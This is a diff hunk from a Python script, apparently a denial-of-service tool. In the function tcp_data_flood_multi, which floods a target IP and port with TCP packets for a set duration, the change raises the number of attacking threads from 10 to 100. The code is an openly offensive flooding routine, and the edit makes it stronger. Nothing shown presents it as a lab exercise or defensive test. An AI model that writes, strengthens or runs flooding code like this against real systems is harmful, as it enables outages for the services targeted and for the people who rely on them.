@@ -152,7 +152,7 @@ def tcp_data_flood_multi(ip, port, duration, packet_size):
         sock.close()
 
     print(Fore.LIGHTBLUE_EX + f"[*] Starting TCP Data flood (Multi-threaded) on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
-    threads = [threading.Thread(target=data_worker) for _ in range(10)]  # 10 threads
+    threads = [threading.Thread(target=data_worker) for _ in range(100)]  # 100 threads
     for t in threads:
         t.start()
     for t in threads:
